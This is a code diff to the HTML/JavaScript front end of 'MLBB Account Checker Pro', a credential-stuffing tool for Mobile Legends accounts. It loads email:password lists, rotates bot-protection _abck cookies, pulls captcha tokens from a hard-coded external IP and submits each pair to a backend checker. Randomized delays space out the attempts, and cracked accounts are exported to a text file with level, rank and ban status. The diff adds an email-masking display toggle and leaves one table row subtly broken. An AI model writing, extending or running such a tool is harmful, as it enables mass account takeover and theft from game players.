@@ -594,6 +594,31 @@
             padding: 8px 12px;
             white-space: nowrap;
         }
+
+        /* Sensor Email Toggle */
+        .sensor-control {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0,0,0,0.3);
+            padding: 8px 12px;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+
+        .sensor-control label {
+            margin-bottom: 0;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .sensor-control input {
+            width: auto;
+            margin: 0;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -728,12 +753,12 @@
                 <div id="auto-captcha-section">
                     <div class="form-group">
                         <label><i class="fas fa-globe"></i> External Captcha API URL</label>
-                        <input type="text" id="captcha-api-url" value=""  placeholder="http://149.104.77.174:1337/token" class="api-url-input">
+                        <input type="text" id="captcha-api-url" value="http://149.104.77.174:1337/token" class="api-url-input">
                     </div>
                 </div>
 
                 <div class="form-group">
-                    <label><i class="fas fa-server"></i> Backend API URL <span id="api-url-badge" class="badge badge-info" style="font-size:0.65rem">Auto</span></label>
+                    <label><i class="fas fa-server"></i> Backend API URL</label>
                     <div class="api-url-manual">
                         <input type="text" id="backend-api-url" placeholder="Auto detected" class="api-url-input">
                         <button id="apply-api-url" class="btn btn-secondary" style="padding:8px 12px">
@@ -743,9 +768,7 @@
                             <i class="fas fa-undo"></i> Reset
                         </button>
                     </div>
-                    <small id="api-url-info" style="color:rgba(255,255,255,0.5); display:block; margin-top:5px;">
-                        <i class="fas fa-info-circle"></i> Auto-detected based on current domain
-                    </small>
+                    <small id="api-url-info" style="color:rgba(255,255,255,0.5); display:block; margin-top:5px;"></small>
                 </div>
 
                 <div class="form-group">
@@ -769,6 +792,20 @@
                         <i class="fas fa-save"></i> Auto Save Results (otomatis simpan setiap hasil)
                     </label>
                     <small style="color:rgba(255,255,255,0.5);">Data akan tetap ada setelah refresh halaman</small>
+                </div>
+
+                <!-- SENSOR EMAIL TOGGLE - TAMBAHAN BARU -->
+                <div class="form-group">
+                    <div class="sensor-control">
+                        <label class="checkbox-label">
+                            <input type="checkbox" id="sensor-email-toggle">
+                            <i class="fas fa-eye-slash"></i> Sensor Email (tampilan website)
+                        </label>
+                        <span class="badge badge-info" style="font-size:0.65rem;">Export tetap asli</span>
+                    </div>
+                    <small style="color:rgba(255,255,255,0.5); display:block; margin-top:5px;">
+                        <i class="fas fa-info-circle"></i> Aktifkan untuk menyembunyikan email di tampilan dengan ***. File export TXT tetap menggunakan email asli.
+                    </small>
                 </div>
             </div>
 
@@ -862,86 +899,33 @@
         </div>
 
         <div class="footer">
-            <p><i class="fas fa-shield-alt"></i> MLBB Account Checker Pro | Full integration with promax.py | Data tersimpan secara lokal (tidak hilang setelah refresh) | Watermark: @BokirTools</p>
+            <p><i class="fas fa-shield-alt"></i> MLBB Account Checker Pro | Full integration with promax.py | Data tersimpan secara lokal | Email di tampilan bisa disensor, export tetap asli | Watermark: @BokirTools</p>
             <p id="api-debug-info" style="font-size:0.65rem; margin-top:5px; color:rgba(255,255,255,0.4);"></p>
         </div>
     </div>
 
     <script>
         // ========== KONFIGURASI API DINAMIS ==========
-        // Fungsi untuk mendeteksi environment dan mendapatkan API URL yang tepat
         function getDefaultApiUrl() {
             const hostname = window.location.hostname;
-            const protocol = window.location.protocol;
+            const isLocal = hostname === 'localhost' || hostname === '127.0.0.1' || hostname.startsWith('192.168.') || hostname.startsWith('10.') || hostname.endsWith('.local');
             
-            // Deteksi apakah di localhost atau IP local
-            const isLocal = hostname === 'localhost' || 
-                           hostname === '127.0.0.1' || 
-                           hostname.startsWith('192.168.') ||
-                           hostname.startsWith('10.') ||
-                           hostname.endsWith('.local');
-            
-            // Deteksi apakah di Vercel Preview
-            const isVercelPreview = hostname.includes('.vercel.app');
-            
-            // Deteksi apakah di Render
-            const isRender = hostname.includes('.onrender.com');
-            
-            // Deteksi apakah di production dengan path relatif
-            if (isLocal) {
-                // Local development
-                return 'http://localhost:5000/api';
-            } else if (isVercelPreview || isRender) {
-                // Vercel/Render deployment - gunakan path relatif
-                return '/api';
-            } else {
-                // Production dengan custom domain - gunakan path relatif
-                return '/api';
-            }
+            if (isLocal) return 'http://localhost:5000/api';
+            return '/api';
         }
         
-        // Inisialisasi API URL
         let API_BASE_URL = localStorage.getItem('api_url_override') || getDefaultApiUrl();
         
-        // Update display di UI
         function updateApiUrlDisplay() {
             const inputField = document.getElementById('backend-api-url');
             const infoSpan = document.getElementById('api-url-info');
-            const badge = document.getElementById('api-url-badge');
-            const isDefault = API_BASE_URL === getDefaultApiUrl();
-            
-            if (inputField) {
-                inputField.value = API_BASE_URL;
-                inputField.placeholder = getDefaultApiUrl();
-            }
-            
-            if (badge) {
-                badge.textContent = isDefault ? 'Auto' : 'Manual';
-                badge.style.background = isDefault ? 'rgba(0,212,255,0.2)' : 'rgba(255,107,107,0.2)';
-                badge.style.color = isDefault ? '#00d4ff' : '#ff6b6b';
-            }
-            
-            if (infoSpan) {
-                if (isDefault) {
-                    infoSpan.innerHTML = `<i class="fas fa-magic"></i> Auto-detected: ${API_BASE_URL} (based on current domain)`;
-                } else {
-                    infoSpan.innerHTML = `<i class="fas fa-edit"></i> Manual override: ${API_BASE_URL}`;
-                }
-            }
-            
-            // Debug info
-            document.getElementById('api-debug-info').innerHTML = `
-                <i class="fas fa-terminal"></i> Host: ${window.location.hostname} | 
-                Protocol: ${window.location.protocol} | 
-                API: ${API_BASE_URL} | 
-                Mode: ${isDefault ? 'Auto' : 'Manual'}
-            `;
+            if (inputField) inputField.value = API_BASE_URL;
+            if (infoSpan) infoSpan.innerHTML = `<i class="fas fa-info-circle"></i> Current API: ${API_BASE_URL}`;
+            document.getElementById('api-debug-info').innerHTML = `<i class="fas fa-terminal"></i> Host: ${window.location.hostname} | API: ${API_BASE_URL}`;
         }
         
-        // Set API URL (dengan save ke localStorage)
         function setApiUrl(url, save = true) {
             if (!url || url.trim() === '') {
-                // Reset ke default
                 API_BASE_URL = getDefaultApiUrl();
                 if (save) localStorage.removeItem('api_url_override');
             } else {
@@ -953,10 +937,7 @@
             checkApiConnection();
         }
         
-        // Reset ke default
-        function resetApiUrl() {
-            setApiUrl('', true);
-        }
+        function resetApiUrl() { setApiUrl('', true); }
         
         // ========== STORAGE KEYS ==========
         const STORAGE_KEYS = {
@@ -978,6 +959,9 @@
         let isApiOnline = false;
         let autoSaveEnabled = true;
         let autoSaveTimeout = null;
+        
+        // SENSOR EMAIL STATE
+        let sensorEmailEnabled = localStorage.getItem('sensor_email') === 'true';
         
         let stats = {
             valid: 0,
@@ -1019,36 +1003,41 @@
             autoSaveToggle: document.getElementById('auto-save-toggle')
         };
         
-        // ========== TOAST NOTIFICATION ==========
+        // ========== TOAST ==========
         function showToast(message, type = 'info') {
             const toast = document.createElement('div');
             toast.className = 'toast';
-            const icons = {
-                success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️'
-            };
+            const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
             toast.innerHTML = `${icons[type] || 'ℹ️'} ${message}`;
             document.body.appendChild(toast);
             setTimeout(() => toast.remove(), 3000);
         }
         
+        // ========== SENSOR EMAIL FUNCTIONS ==========
+        function sensorEmail(email) {
+            if (!sensorEmailEnabled || !email) return email;
+            try {
+                const atIndex = email.indexOf('@');
+                if (atIndex === -1) return email;
+                const username = email.substring(0, atIndex);
+                const domain = email.substring(atIndex);
+                let sensoredUsername;
+                if (username.length <= 3) sensoredUsername = username.charAt(0) + '***';
+                else if (username.length <= 6) sensoredUsername = username.substring(0, 2) + '***';
+                else sensoredUsername = username.substring(0, 3) + '***';
+                return sensoredUsername + domain;
+            } catch { return email; }
+        }
+        
         // ========== STORAGE FUNCTIONS ==========
         function saveToLocalStorage() {
             if (!autoSaveEnabled) return false;
-            
             try {
-                const dataToSave = {
-                    results: results,
-                    stats: stats,
-                    lastSave: new Date().toISOString()
-                };
-                localStorage.setItem(STORAGE_KEYS.RESULTS, JSON.stringify(dataToSave));
-                sessionStorage.setItem(STORAGE_KEYS.SESSION_DATA, JSON.stringify(dataToSave));
+                localStorage.setItem(STORAGE_KEYS.RESULTS, JSON.stringify({ results: results, stats: stats, lastSave: new Date().toISOString() }));
+                sessionStorage.setItem(STORAGE_KEYS.SESSION_DATA, JSON.stringify({ results: results, stats: stats }));
                 document.getElementById('last-save-time').innerHTML = `(Last saved: ${new Date().toLocaleTimeString()})`;
                 return true;
-            } catch (error) {
-                console.error('Failed to save:', error);
-                return false;
-            }
+            } catch (error) { return false; }
         }
         
         function loadFromLocalStorage() {
@@ -1056,14 +1045,13 @@
                 const savedData = localStorage.getItem(STORAGE_KEYS.RESULTS);
                 if (savedData) {
                     const parsed = JSON.parse(savedData);
-                    if (parsed.results && Array.isArray(parsed.results)) results = parsed.results;
+                    if (parsed.results) results = parsed.results;
                     if (parsed.stats) stats = parsed.stats;
                     updateStats();
                     renderResults();
                     showToast(`✅ Data loaded: ${results.length} accounts`, 'success');
                     return true;
                 }
-                
                 const sessionData = sessionStorage.getItem(STORAGE_KEYS.SESSION_DATA);
                 if (sessionData) {
                     const parsed = JSON.parse(sessionData);
@@ -1075,17 +1063,13 @@
                     return true;
                 }
                 return false;
-            } catch (error) {
-                console.error('Failed to load:', error);
-                return false;
-            }
+            } catch (error) { return false; }
         }
         
         function clearStorage() {
-            if (confirm('⚠️ Delete all saved data? This cannot be undone.')) {
+            if (confirm('⚠️ Delete all saved data?')) {
                 localStorage.removeItem(STORAGE_KEYS.RESULTS);
                 localStorage.removeItem(STORAGE_KEYS.STATS);
-                localStorage.removeItem(STORAGE_KEYS.LAST_SAVE);
                 sessionStorage.removeItem(STORAGE_KEYS.SESSION_DATA);
                 showToast('🗑️ All saved data cleared', 'warning');
                 if (!isChecking) {
@@ -1098,15 +1082,8 @@
         }
         
         function exportAllData() {
-            const exportData = {
-                exportDate: new Date().toISOString(),
-                version: '1.0',
-                stats: stats,
-                results: results,
-                totalAccounts: results.length
-            };
-            const dataStr = JSON.stringify(exportData, null, 2);
-            const blob = new Blob([dataStr], { type: 'application/json' });
+            const exportData = { exportDate: new Date().toISOString(), stats: stats, results: results };
+            const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
@@ -1141,7 +1118,9 @@
                 if (response.ok) {
                     const data = await response.json();
                     isApiOnline = true;
-                    elements.apiStatus.innerHTML = `<i class="fas fa-check-circle"></i> API Online | ${data.timestamp || ''}`;
+                    // FORMAT SEPERTI DI PROMAX.PY
+                    const timestamp = data.timestamp ? new Date(data.timestamp).toLocaleString() : new Date().toLocaleString();
+                    elements.apiStatus.innerHTML = `<i class="fas fa-check-circle"></i> API Online | Last checked: ${timestamp}`;
                     elements.apiStatus.className = 'api-status online';
                     elements.startBtn.disabled = false;
                     return true;
@@ -1158,47 +1137,28 @@
         }
         
         async function getCaptchaFromApi() {
-            const apiUrl = elements.captchaApiUrl.value;
             try {
-                const response = await fetch(apiUrl, { timeout: 10000 });
+                const response = await fetch(elements.captchaApiUrl.value, { timeout: 10000 });
                 const data = await response.json();
                 if (data.success && data.token) return data.token;
                 return null;
-            } catch (error) {
-                console.error('Captcha API error:', error);
-                return null;
-            }
+            } catch { return null; }
         }
         
         async function checkAccountViaBackend(email, password, abckCookie, captchaToken) {
             try {
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), 30000);
-                
                 const response = await fetch(`${API_BASE_URL}/check`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        email: email,
-                        password: password,
-                        abck_cookie: abckCookie,
-                        captcha_token: captchaToken
-                    }),
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password, abck_cookie: abckCookie, captcha_token: captchaToken }),
                     signal: controller.signal
                 });
-                
                 clearTimeout(timeoutId);
-                
-                const contentType = response.headers.get('content-type');
-                if (!contentType || !contentType.includes('application/json')) {
-                    throw new Error('Server returned non-JSON response');
-                }
-                
                 const result = await response.json();
-                
                 if (result.success) {
                     return {
-                        email: email, password: password, status: result.status,
+                        email, password, status: result.status,
                         name: result.data.name, level: result.data.level,
                         roleId: result.data.role_id, zoneId: result.data.zone_id,
                         currentRank: result.data.current_rank, highestRank: result.data.highest_rank,
@@ -1206,41 +1166,21 @@
                         createDate: result.data.create_date, banStatus: result.data.ban_status
                     };
                 } else {
-                    return {
-                        email: email, password: password, status: result.status || 'invalid',
-                        name: result.status === 'captcha_failed' ? 'Captcha Failed' : 'INVALID',
-                        level: 0, roleId: 'N/A', zoneId: 'N/A', currentRank: 'N/A',
-                        highestRank: 'N/A', bindings: 'N/A', region: 'N/A',
-                        createDate: 'N/A', banStatus: 'No', message: result.message
-                    };
+                    return { email, password, status: result.status || 'invalid', name: 'INVALID', level: 0,
+                        roleId: 'N/A', zoneId: 'N/A', currentRank: 'N/A', highestRank: 'N/A',
+                        bindings: 'N/A', region: 'N/A', createDate: 'N/A', banStatus: 'No' };
                 }
             } catch (error) {
-                console.error('Check error:', error);
-                return {
-                    email: email, password: password, status: 'error',
-                    name: 'Error', level: 0, roleId: 'N/A', zoneId: 'N/A',
-                    currentRank: 'N/A', highestRank: 'N/A', bindings: 'N/A',
-                    region: 'N/A', createDate: 'N/A', banStatus: 'No',
-                    message: error.message
-                };
+                return { email, password, status: 'error', name: 'Error', level: 0,
+                    roleId: 'N/A', zoneId: 'N/A', currentRank: 'N/A', highestRank: 'N/A',
+                    bindings: 'N/A', region: 'N/A', createDate: 'N/A', banStatus: 'No' };
             }
         }
         
         // ========== UTILITY FUNCTIONS ==========
-        function parseAccounts() {
-            const text = elements.accountsInput.value;
-            return text.split('\n').map(l => l.trim()).filter(l => l && l.includes(':'));
-        }
-        
-        function parseAbckCookies() {
-            const text = elements.abckInput.value;
-            return text.split('\n').map(l => l.trim()).filter(l => l);
-        }
-        
-        function parseCaptchas() {
-            const text = elements.captchaInput.value;
-            return text.split('\n').map(l => l.trim()).filter(l => l);
-        }
+        function parseAccounts() { return elements.accountsInput.value.split('\n').map(l => l.trim()).filter(l => l && l.includes(':')); }
+        function parseAbckCookies() { return elements.abckInput.value.split('\n').map(l => l.trim()).filter(l => l); }
+        function parseCaptchas() { return elements.captchaInput.value.split('\n').map(l => l.trim()).filter(l => l); }
         
         function updateStats() {
             elements.statValid.textContent = stats.valid;
@@ -1252,7 +1192,6 @@
             elements.liveInvalid.textContent = stats.invalid;
             elements.liveBanned.textContent = stats.banned;
             elements.liveChecked.textContent = stats.checked;
-            
             const percent = stats.total > 0 ? (stats.checked / stats.total) * 100 : 0;
             elements.progressFill.style.width = `${percent}%`;
             elements.progressText.textContent = `Checked ${stats.checked} of ${stats.total} accounts (${Math.round(percent)}%)`;
@@ -1265,7 +1204,7 @@
             else if (currentFilter === 'banned') filteredResults = results.filter(r => r.status === 'banned');
             
             if (filteredResults.length === 0) {
-                elements.resultsBody.innerHTML = '<tr><td colspan="12" style="text-align:center">No accounts to display</td></tr>';
+                elements.resultsBody.innerHTML = '.<td colspan="12" style="text-align:center">No accounts to display</td>';
                 return;
             }
             
@@ -1274,190 +1213,42 @@
                 const statusClass = `status-${result.status === 'error' ? 'invalid' : result.status}`;
                 const statusText = (result.status === 'error' ? 'INVALID' : result.status.toUpperCase());
                 const displayId = result.roleId && result.zoneId ? `${result.roleId} (${result.zoneId})` : '-';
+                const displayEmail = sensorEmail(result.email); // SENSOR UNTUK TAMPILAN
                 
-                html += `
-                    <tr>
-                        <td>${idx + 1}</td>
-                        <td style="font-family:monospace; font-size:0.7rem">${escapeHtml(result.email)}</td>
-                        <td><span class="status-badge ${statusClass}">${statusText}</span></td>
-                        <td>${escapeHtml(result.name || '-')}</td>
-                        <td style="font-size:0.65rem">${displayId}</td>
-                        <td>${result.level || '-'}</td>
-                        <td>${escapeHtml(result.currentRank || '-')}</td>
-                        <td>${escapeHtml(result.highestRank || '-')}</td>
-                        <td style="font-size:0.7rem">${escapeHtml(result.bindings || '-')}</td>
-                        <td>${escapeHtml(result.region || '-')}</td>
-                        <td style="font-size:0.7rem">${escapeHtml(result.createDate || '-')}</td>
-                        <td style="font-size:0.7rem">${escapeHtml(result.banStatus || '-')}</td>
-                    </tr>
-                `;
+                html += `<tr>
+                    <td>${idx + 1}</td>
+                    <td style="font-family:monospace; font-size:0.7rem">${escapeHtml(displayEmail)}</td>
+                    <td><span class="status-badge ${statusClass}">${statusText}</span></td>
+                    <td>${escapeHtml(result.name || '-')}</td>
+                    <td style="font-size:0.65rem">${displayId}</td>
+                    <td>${result.level || '-'}</td>
+                    <td>${escapeHtml(result.currentRank || '-')}</td>
+                    <td>${escapeHtml(result.highestRank || '-')}</td>
+                    <td style="font-size:0.7rem">${escapeHtml(result.bindings || '-')}</td>
+                    <td>${escapeHtml(result.region || '-')}</td>
+                    <td style="font-size:0.7rem">${escapeHtml(result.createDate || '-')}</td>
+                    <td style="font-size:0.7rem">${escapeHtml(result.banStatus || '-')}</td>
+                </tr>`;
             });
             elements.resultsBody.innerHTML = html;
         }
         
-        function escapeHtml(text) {
-            if (!text) return '-';
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
+        function escapeHtml(text) { if (!text) return '-'; const div = document.createElement('div'); div.textContent = text; return div.innerHTML; }
+        function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
         
-        function delay(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
+        function addResult(result) { results.push(result); renderResults(); triggerAutoSave(); }
         
-        function addResult(result) {
-            results.push(result);
-            renderResults();
-            triggerAutoSave();
-        }
-        
-        // ========== MAIN CHECKING FUNCTION ==========
-        async function startChecking() {
-            if (isChecking) return;
-            
-            if (!isApiOnline) {
-                const connected = await checkApiConnection();
-                if (!connected) {
-                    alert('Cannot connect to backend API. Please make sure the server is running.');
-                    return;
-                }
-            }
-            
-            accounts = parseAccounts();
-            if (accounts.length === 0) {
-                alert('Please enter accounts in email:password format');
-                return;
-            }
-            
-            abckCookies = parseAbckCookies();
-            if (abckCookies.length === 0) {
-                alert('Please enter at least one _abck cookie');
-                return;
-            }
-            
-            if (captchaMode === 'manual') {
-                captchas = parseCaptchas();
-                if (captchas.length === 0) {
-                    alert('Please enter captcha tokens for manual mode');
-                    return;
-                }
-            }
-            
-            stats = { valid: 0, invalid: 0, banned: 0, checked: 0, total: accounts.length, highestLevel: 0 };
-            results = [];
-            currentIndex = 0;
-            isChecking = true;
-            
-            elements.startBtn.disabled = true;
-            elements.stopBtn.disabled = false;
-            
-            updateStats();
-            renderResults();
-            
-            while (isChecking && currentIndex < accounts.length) {
-                const account = accounts[currentIndex];
-                const [email, password] = account.split(':', 2);
-                
-                const abckIndex = Math.floor(currentIndex / 5) % abckCookies.length;
-                const currentAbck = abckCookies[abckIndex];
-                
-                let captchaToken = '';
-                elements.currentAccount.textContent = `[${currentIndex+1}/${stats.total}] Fetching captcha for ${email}...`;
-                
-                if (captchaMode === 'auto') {
-                    captchaToken = await getCaptchaFromApi();
-                    if (!captchaToken) {
-                        const errorResult = {
-                            email, password, status: 'invalid', name: 'Captcha Failed',
-                            level: 0, roleId: 'N/A', zoneId: 'N/A', currentRank: 'N/A',
-                            highestRank: 'N/A', bindings: 'N/A', region: 'N/A',
-                            createDate: 'N/A', banStatus: 'No'
-                        };
-                        addResult(errorResult);
-                        stats.invalid++;
-                        stats.checked++;
-                        updateStats();
-                        currentIndex++;
-                        continue;
-                    }
-                } else {
-                    captchaToken = captchas[currentIndex % captchas.length];
-                }
-                
-                elements.currentAccount.textContent = `[${currentIndex+1}/${stats.total}] Checking: ${email} | _abck #${abckIndex+1}`;
-                
-                try {
-                    const result = await checkAccountViaBackend(email, password, currentAbck, captchaToken);
-                    
-                    const levelInt = parseInt(result.level) || 0;
-                    if (levelInt > stats.highestLevel) stats.highestLevel = levelInt;
-                    
-                    if (result.status === 'valid') stats.valid++;
-                    else if (result.status === 'banned') stats.banned++;
-                    else stats.invalid++;
-                    
-                    stats.checked++;
-                    addResult(result);
-                    updateStats();
-                } catch (error) {
-                    const errorResult = {
-                        email, password, status: 'error', name: 'Error',
-                        level: 0, roleId: 'N/A', zoneId: 'N/A', currentRank: 'N/A',
-                        highestRank: 'N/A', bindings: 'N/A', region: 'N/A',
-                        createDate: 'N/A', banStatus: 'No'
-                    };
-                    addResult(errorResult);
-                    stats.invalid++;
-                    stats.checked++;
-                    updateStats();
-                }
-                
-                currentIndex++;
-                
-                if (isChecking && currentIndex < accounts.length) {
-                    const minDelay = parseInt(elements.minDelay.value) || 3;
-                    const maxDelay = parseInt(elements.maxDelay.value) || 8;
-                    const delayTime = Math.floor(Math.random() * (maxDelay - minDelay + 1) + minDelay) * 1000;
-                    await delay(delayTime);
-                }
-            }
-            
-            isChecking = false;
-            elements.startBtn.disabled = false;
-            elements.stopBtn.disabled = true;
-            elements.currentAccount.textContent = '';
-            if (currentIndex >= accounts.length) elements.progressText.textContent = '✅ Checking completed!';
-            saveToLocalStorage();
-        }
-        
-        function stopChecking() {
-            isChecking = false;
-            elements.startBtn.disabled = false;
-            elements.stopBtn.disabled = true;
-            elements.progressText.textContent = '⏸️ Checking stopped';
-        }
-        
-        function clearResults() {
-            if (isChecking) { alert('Please stop checking first'); return; }
-            results = [];
-            stats = { valid: 0, invalid: 0, banned: 0, checked: 0, total: 0, highestLevel: 0 };
-            updateStats();
-            renderResults();
-            elements.progressFill.style.width = '0%';
-            elements.progressText.textContent = 'Ready to check accounts';
-            if (autoSaveEnabled) saveToLocalStorage();
-        }
-        
+        // ========== EXPORT RESULTS (EMAIL ASLI, TIDAK DISENSOR) ==========
         function exportResults() {
             if (results.length === 0) { alert('No results to export'); return; }
             
             let validContent = '', invalidContent = '', bannedContent = '';
             results.forEach(result => {
-                const line = `${result.email}:${result.password} | Nama: ${result.name} | ID: ${result.roleId} (${result.zoneId}) | Level: ${result.level} | Current Rank: ${result.currentRank} | Highest Rank: ${result.highestRank} | Bind: ${result.bindings} | Region: ${result.region} | Create Date: ${result.createDate} | Ban: ${result.banStatus} | Config:@BokirTools\n`;
+                const originalEmail = result.email; // EMAIL ASLI, TIDAK DISENSOR
+                const line = `${originalEmail}:${result.password} | Nama: ${result.name} | ID: ${result.roleId} (${result.zoneId}) | Level: ${result.level} | Current Rank: ${result.currentRank} | Highest Rank: ${result.highestRank} | Bind: ${result.bindings} | Region: ${result.region} | Create Date: ${result.createDate} | Ban: ${result.banStatus} | Config:@BokirTools\n`;
                 if (result.status === 'valid') validContent += line;
                 else if (result.status === 'banned') bannedContent += line;
-                else invalidContent += `${result.email}:${result.password}\n`;
+                else invalidContent += `${originalEmail}:${result.password}\n`;
             });
             
             const date = new Date().toISOString().slice(0,19).replace(/:/g, '-');
@@ -1469,59 +1260,103 @@
             a.download = `BokirTools_${date}.txt`;
             a.click();
             URL.revokeObjectURL(url);
-            showToast(`📥 Results exported (${results.length} accounts)`, 'success');
+            showToast(`📥 Results exported (${results.length} accounts) - Email asli (tidak tersensor)`, 'success');
         }
+        
+        // ========== MAIN CHECKING FUNCTION ==========
+        async function startChecking() {
+            if (isChecking) return;
+            if (!isApiOnline && !(await checkApiConnection())) { alert('Cannot connect to backend API.'); return; }
+            
+            accounts = parseAccounts();
+            if (accounts.length === 0) { alert('Please enter accounts'); return; }
+            abckCookies = parseAbckCookies();
+            if (abckCookies.length === 0) { alert('Please enter _abck cookies'); return; }
+            if (captchaMode === 'manual') { captchas = parseCaptchas(); if (captchas.length === 0) { alert('Please enter captcha tokens'); return; } }
+            
+            stats = { valid: 0, invalid: 0, banned: 0, checked: 0, total: accounts.length, highestLevel: 0 };
+            results = [];
+            currentIndex = 0;
+            isChecking = true;
+            elements.startBtn.disabled = true;
+            elements.stopBtn.disabled = false;
+            updateStats();
+            renderResults();
+            
+            while (isChecking && currentIndex < accounts.length) {
+                const account = accounts[currentIndex];
+                const [email, password] = account.split(':', 2);
+                const abckIndex = Math.floor(currentIndex / 5) % abckCookies.length;
+                const currentAbck = abckCookies[abckIndex];
+                let captchaToken = '';
+                elements.currentAccount.textContent = `[${currentIndex+1}/${stats.total}] Fetching captcha...`;
+                
+                if (captchaMode === 'auto') {
+                    captchaToken = await getCaptchaFromApi();
+                    if (!captchaToken) {
+                        addResult({ email, password, status: 'invalid', name: 'Captcha Failed', level: 0, roleId: 'N/A', zoneId: 'N/A', currentRank: 'N/A', highestRank: 'N/A', bindings: 'N/A', region: 'N/A', createDate: 'N/A', banStatus: 'No' });
+                        stats.invalid++; stats.checked++; updateStats(); currentIndex++; continue;
+                    }
+                } else { captchaToken = captchas[currentIndex % captchas.length]; }
+                
+                elements.currentAccount.textContent = `[${currentIndex+1}/${stats.total}] Checking: ${email}`;
+                const result = await checkAccountViaBackend(email, password, currentAbck, captchaToken);
+                const levelInt = parseInt(result.level) || 0;
+                if (levelInt > stats.highestLevel) stats.highestLevel = levelInt;
+                if (result.status === 'valid') stats.valid++;
+                else if (result.status === 'banned') stats.banned++;
+                else stats.invalid++;
+                stats.checked++;
+                addResult(result);
+                updateStats();
+                currentIndex++;
+                
+                if (isChecking && currentIndex < accounts.length) {
+                    const minDelay = parseInt(elements.minDelay.value) || 3;
+                    const maxDelay = parseInt(elements.maxDelay.value) || 8;
+                    await delay(Math.floor(Math.random() * (maxDelay - minDelay + 1) + minDelay) * 1000);
+                }
+            }
+            isChecking = false;
+            elements.startBtn.disabled = false;
+            elements.stopBtn.disabled = true;
+            elements.currentAccount.textContent = '';
+            if (currentIndex >= accounts.length) elements.progressText.textContent = '✅ Checking completed!';
+            saveToLocalStorage();
+        }
+        
+        function stopChecking() { isChecking = false; elements.startBtn.disabled = false; elements.stopBtn.disabled = true; elements.progressText.textContent = '⏸️ Checking stopped'; }
+        function clearResults() { if (isChecking) { alert('Please stop checking first'); return; } results = []; stats = { valid: 0, invalid: 0, banned: 0, checked: 0, total: 0, highestLevel: 0 }; updateStats(); renderResults(); elements.progressFill.style.width = '0%'; elements.progressText.textContent = 'Ready to check accounts'; if (autoSaveEnabled) saveToLocalStorage(); }
         
         // ========== FILE UPLOAD ==========
         function uploadAccountsFile() { document.getElementById('accounts-file-input').click(); }
         function uploadAbckFile() { document.getElementById('abck-file-input').click(); }
         function uploadCaptchaFile() { document.getElementById('captcha-file-input').click(); }
-        
-        document.getElementById('accounts-file-input').addEventListener('change', (e) => {
-            const file = e.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = (event) => { elements.accountsInput.value = event.target.result; };
-                reader.readAsText(file);
-            }
-        });
-        
-        document.getElementById('abck-file-input').addEventListener('change', (e) => {
-            const file = e.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = (event) => { elements.abckInput.value = event.target.result; };
-                reader.readAsText(file);
-            }
-        });
-        
-        document.getElementById('captcha-file-input').addEventListener('change', (e) => {
-            const file = e.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = (event) => { elements.captchaInput.value = event.target.result; };
-                reader.readAsText(file);
-            }
-        });
+        document.getElementById('accounts-file-input').addEventListener('change', (e) => { const file = e.target.files[0]; if (file) { const reader = new FileReader(); reader.onload = (event) => { elements.accountsInput.value = event.target.result; }; reader.readAsText(file); } });
+        document.getElementById('abck-file-input').addEventListener('change', (e) => { const file = e.target.files[0]; if (file) { const reader = new FileReader(); reader.onload = (event) => { elements.abckInput.value = event.target.result; }; reader.readAsText(file); } });
+        document.getElementById('captcha-file-input').addEventListener('change', (e) => { const file = e.target.files[0]; if (file) { const reader = new FileReader(); reader.onload = (event) => { elements.captchaInput.value = event.target.result; }; reader.readAsText(file); } });
         
         // ========== CAPTCHA MODE ==========
         function setCaptchaMode(mode) {
             captchaMode = mode;
-            if (mode === 'auto') {
-                document.getElementById('manual-captcha-section').style.display = 'none';
-                document.getElementById('auto-captcha-section').style.display = 'block';
-                document.getElementById('captcha-auto-btn').style.background = '#00d4ff20';
-                document.getElementById('captcha-manual-btn').style.background = '';
-            } else {
-                document.getElementById('manual-captcha-section').style.display = 'block';
-                document.getElementById('auto-captcha-section').style.display = 'none';
-                document.getElementById('captcha-manual-btn').style.background = '#00d4ff20';
-                document.getElementById('captcha-auto-btn').style.background = '';
-            }
+            if (mode === 'auto') { document.getElementById('manual-captcha-section').style.display = 'none'; document.getElementById('auto-captcha-section').style.display = 'block'; document.getElementById('captcha-auto-btn').style.background = '#00d4ff20'; document.getElementById('captcha-manual-btn').style.background = ''; }
+            else { document.getElementById('manual-captcha-section').style.display = 'block'; document.getElementById('auto-captcha-section').style.display = 'none'; document.getElementById('captcha-manual-btn').style.background = '#00d4ff20'; document.getElementById('captcha-auto-btn').style.background = ''; }
         }
         
         // ========== FILTER ==========
         function setFilter(filter) { currentFilter = filter; renderResults(); }
+        
+        // ========== SENSOR TOGGLE ==========
+        const sensorToggle = document.getElementById('sensor-email-toggle');
+        if (sensorToggle) {
+            sensorToggle.checked = sensorEmailEnabled;
+            sensorToggle.addEventListener('change', (e) => {
+                sensorEmailEnabled = e.target.checked;
+                localStorage.setItem('sensor_email', sensorEmailEnabled);
+                showToast(sensorEmailEnabled ? '🔒 Email sensor diaktifkan (hanya untuk tampilan)' : '👁️ Email sensor dinonaktifkan', 'info');
+                renderResults();
+            });
+        }
         
         // ========== EVENT LISTENERS ==========
         elements.startBtn.addEventListener('click', startChecking);
@@ -1543,23 +1378,15 @@
         document.getElementById('export-data-btn').addEventListener('click', exportAllData);
         document.getElementById('apply-api-url').addEventListener('click', () => setApiUrl(elements.backendApiUrl.value, true));
         document.getElementById('reset-api-url').addEventListener('click', resetApiUrl);
-        
